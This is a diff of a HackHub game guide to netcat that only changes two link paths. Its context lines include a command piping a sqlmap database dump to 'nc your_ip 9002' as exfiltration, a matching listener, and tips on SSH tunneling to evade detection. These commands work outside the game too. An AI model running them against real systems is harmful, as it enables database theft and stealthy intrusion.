@@ -32,7 +32,7 @@ Under the hood, the in-game netcat binary mirrors the real `nc` utility. It supp
 | Port scan (`-z`) | Probes open ports quickly | Pre-engagement recon on mission targets |
 | File transfer | Sends/receives raw bytes | Log exfiltration and payload staging |
 
-If you are brand new to the toolkit, start by reading the broader [HackHub tools guide for new players](/en/tools/HackHub-Beginner-Toolkit/) to see where netcat sits in the wider loadout philosophy before diving into the command-level details below.
+If you are brand new to the toolkit, start by reading the broader [HackHub tools guide for new players](/en/tools/) to see where netcat sits in the wider loadout philosophy before diving into the command-level details below.
 
 ## Core Netcat Commands for HackHub Players
 
@@ -99,7 +99,7 @@ The most reliable combo is **netcat plus nmap**. Use nmap for service version de
 
 The mental model for advanced chaining is to treat netcat as the **transport layer** between two higher-level tools. For example, you can pipe the output of a SQL injection tool directly into netcat with `sqlmap -u target --batch --dump | nc your_ip 9002`, which streams the entire database exfiltration over a single netcat session. The receiving listener catches the dump and writes it to disk with `nc -lvp 9002 > db.sql`.
 
-For bypass-firewall missions, the canonical chain is **netcat plus SSH tunneling**, where netcat establishes the initial foothold and SSH maintains a stable encrypted channel afterward. Many players report that the HackHub detection AI watches the raw netcat connection closely, so layering SSH on top cuts the detection rate by a noticeable margin. The combination is covered more thoroughly in our [HackHub advanced reverse shell walkthrough](/en/tools/HackHub-Reverse-Shell-Walkthrough/), which pairs nicely with the listener patterns covered above.
+For bypass-firewall missions, the canonical chain is **netcat plus SSH tunneling**, where netcat establishes the initial foothold and SSH maintains a stable encrypted channel afterward. Many players report that the HackHub detection AI watches the raw netcat connection closely, so layering SSH on top cuts the detection rate by a noticeable margin. The combination is covered more thoroughly in our [HackHub advanced reverse shell walkthrough](/en/tools/), which pairs nicely with the listener patterns covered above.
 
 ### Stealth Mode and Detection Avoidance
 
